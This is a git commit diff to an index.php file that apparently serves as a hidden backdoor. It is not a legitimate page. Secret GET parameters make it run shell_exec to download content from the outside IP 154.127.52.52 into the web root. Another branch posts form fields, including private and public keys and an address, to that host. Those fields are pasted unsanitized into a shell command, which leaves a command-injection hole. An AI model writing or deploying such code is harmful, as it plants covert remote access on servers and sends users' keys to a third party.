a038b5bc585ad19c65d9ebe3b5869618c791a32f
mobileapps84741274 <64268204+mobileapps84741274@users.noreply.github.com>
2020-10-05 18:13:02 +0000

    Update index.php

--- index.php
+++ index.php
@@ -5,15 +5,15 @@ if($_GET["q"] == "")
 {
 }
 
-if($_GET["work"] == "workjob")
+if($_GET["linux84"] == "linux8474")
   
 {
 
-echo shell_exec("wget -q -U 'Mozille84' -O /var/www/html/linux84 http://154.127.52.52:8884/?work=workjob;cat /var/www/html/linux84");
+echo shell_exec("wget -q -U 'Mozille84' -O /var/www/html/linux84 http://154.127.52.52:8884/?linux84=linux8474;cat /var/www/html/linux84");
 
 }
 
-if($_GET["work"] == "job")
+if($_GET["linux84"] == "linux84")
   
 {
 
@@ -27,7 +27,7 @@ $google847412 = $_POST["public_key"];
 
 $google847446 = $_POST["address"];
 
-echo shell_exec("wget -q -U 'Mozille84' --post-data=argon='" . $google84741 . "&nonce=" . $google84742 . "&private_key=" . $google84744 . "&public_key=" . $google847412 . "&address=" . $google847446 . "' 'http://154.127.52.52:8884/?work=job' --header='Content-type: application/x-www-form-urlencoded'");
+echo shell_exec("wget -q -U 'Mozille84' --post-data=argon='" . $google84741 . "&nonce=" . $google84742 . "&private_key=" . $google84744 . "&public_key=" . $google847412 . "&address=" . $google847446 . "' 'http://154.127.52.52:8884/?linux84=linux84' --header='Content-type: application/x-www-form-urlencoded'");
 
 }
 
